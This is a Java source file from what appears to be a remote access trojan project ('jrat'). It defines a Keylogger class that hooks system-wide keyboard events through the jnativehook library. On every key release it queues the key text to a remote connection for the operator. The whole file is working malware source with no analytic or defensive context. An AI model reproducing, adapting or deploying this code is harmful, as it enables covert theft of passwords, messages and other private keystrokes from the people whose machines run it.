package jrat.module.keys;

import jrat.client.Connection;
import jrat.module.keys.packets.PacketKey;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;

public class Keylogger implements NativeKeyListener {

    public static List<String> chars = new ArrayList<>();

    public static Keylogger instance;

    private Connection con;

    public Keylogger(Connection con) {
        this.con = con;
    }

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {

	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
        String text = NativeKeyEvent.getKeyText(e.getKeyCode());

        con.addToSendQueue(new PacketKey(text));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {

    }
}
